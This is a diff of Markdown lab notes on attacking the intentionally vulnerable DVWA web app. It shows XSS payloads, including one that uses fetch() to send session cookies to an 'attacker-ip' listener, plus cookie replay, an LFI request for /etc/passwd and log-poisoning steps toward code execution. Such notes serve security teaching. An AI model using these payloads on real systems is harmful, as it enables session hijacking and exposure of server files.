@@ -208,7 +208,7 @@ Important thing to consider: there is data and code(data operations). Most of th
 
 In the DVWA web app go to sections ```XSS reflected``` or ```XSS stored```. Input something like:
 
-```javascript 
+```html 
 <script>alert('XSS attack')</script>
 ```
 
@@ -216,7 +216,7 @@ Now revisit page, you should get an alert.
 
 More sophisticated attack would involve getting User's session cookies and Authentication with them. For that go to ```XSS stored```, type in ```Message``` field and click ```Sign Guestbook```: 
 
-```javascript
+```html
 <script>fetch('http://attacker-ip:8000/?c='+document.cookies)</script>
 ```
 
@@ -227,3 +227,17 @@ python3 -m http.server -b <attacker-ip> 8000
 ```
 
 Now revisit the ```XSS stored``` page, you should get cookies in Kali's terminal, that's your key to authentication. From now just logout and inject this cookie value as ```PHPSESSID``` in DevTools, navigate to Auth Required page(something like http://target-ip/dvwa/), you should be able to see it without entering credentials. 
+
+**LFI and RCE** - application takes user input as it was a file path, therefore User can gain access to files(data in these files) which normally should not be exposed to the public. 
+
+1) **LFI(Local FIle Inclusion)** - read or include files that already exist on the server.
+2) **RCE(Remote Code Execution)** - execute malicious code with LFI 
+
+In the ```DVWA``` web app go to http://target-ip/vulnerabilities/fi/?page=/etc/passwd, you should be able to see this file in browser. We can implement **RCE** because PHP uses ```include('page')``` which not only loads a page, but also runs code is there is some. 
+
+We can also use **Log Poisoning** tactic which allows us to execute code when a log page loads. It will be complicated to run this tactic in Metaspoitable2 due to restricted log files access, but the process would look like this: 
+
+1) Find a log file that PHP can read via LFI. 
+2) Inject PHP code in something that will land in such a log file(a header, a username, a subject line)
+3) LFI-include the log -> PHP parse your injection -> code executes
+
